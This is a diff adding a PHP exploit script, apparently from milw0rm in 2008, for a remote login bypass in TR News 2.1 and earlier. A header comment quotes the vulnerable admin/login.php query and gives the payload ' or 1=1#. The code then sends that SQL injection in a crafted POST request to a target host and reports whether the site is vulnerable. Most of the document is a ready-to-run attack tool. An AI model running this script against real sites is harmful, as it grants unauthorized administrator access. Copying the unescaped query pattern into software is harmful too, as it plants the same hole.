@@ -1,0 +1,94 @@
+<?php
+
+error_reporting(0);
+
+/*
+   ------------------------------------------------------
+   TR News <= 2.1 (login.php) Remote Login ByPass Exploit
+   ------------------------------------------------------
+   By StAkeR[at]hotmail[dot]it
+   http://www.easy-script.com/scripts-dl/trscript-21.zip
+
+   File admin/login.php
+   
+   1. <?
+   2.	if(isset($_POST['login_ad']) && ($_POST['password']))
+   3.   {
+   4.	include("../include/connexion.php");
+   5.	$login=$_POST["login_ad"];
+   6.	$pass=md5($_POST["password"]);
+   7.	$sql="SELECT * FROM tr_user_news WHERE pseudo='$login' AND pass='$pass';";
+   8.	$p = mysql_query($sql);
+   9.	$row = mysql_fetch_assoc($p);
+  10.	$admin = $row['admin'];
+  11.	if($admin != 1)
+  
+  $login = $_POST"login_ad"]; isn't escaped,so you can insert SQL code...
+  how to fix? sanize $login with mysql_real_escape_string or htmlentities
+  
+  
+  NOTE:
+  
+  if the website is vulnerable,you must go to admin/login.php
+  
+  Username: ' or 1=1#
+  Password: no-deface
+  
+*/
+
+if(preg_match('/http://(.+?)/i',$argv[1]) or empty($argv[1])) athos();
+
+$host = explode('/',$argv[1]);
+$auth = "login_ad=%27+or+1%3D1%23&password=athos";
+
+
+$data = "POST /$host[1]/admin/login.php HTTP/1.1\r\n". 
+        "Host: $host[0]\r\n".
+        "Content-Type: application/x-www-form-urlencoded\r\n".
+        "Content-Length: ".strlen($auth)."\r\n\r\n".
+        "$auth\r\n\r\n";
+  
+  
+if(!$socket = fsockopen($host[0],80)) die("fsockopen() error!\n");  
+if(!fputs($socket,$data)) die("fputs() error!\n");
+
+
+while(!feof($socket))
+{
+  $content .= fgets($socket);
+} fclose($socket);
+
+if(preg_match("/location: main\.php\?mode=main/i",$content))
+{
+  exploiting();
+  echo "\n[+] Exploit Successfully!\n[+] Site Vulnerable\n";
+  exit;
+}
+else
+{
+  exploiting();
+  echo "\n[+] Exploit Failed!\n[+] Site Not Vulnerable!\n";
+  exit;
+}
+  
+function athos()
+{
+  global $argv;
+  
+  echo "[+] TR News <= 2.1 (login.php) Remote Login ByPass Exploit\n";
+  echo "[+] Usage: php $argv[0] [host/path]\r\n";
+  exit;
+}
+  
+function exploiting()
+{
+  echo "[+] Exploiting";
+
+  for($i=0;$i<=3;$i++) 
+  {
+    echo "."; 
+    sleep(1);
+  }
+}  
+
+# milw0rm.com [2008-11-04]
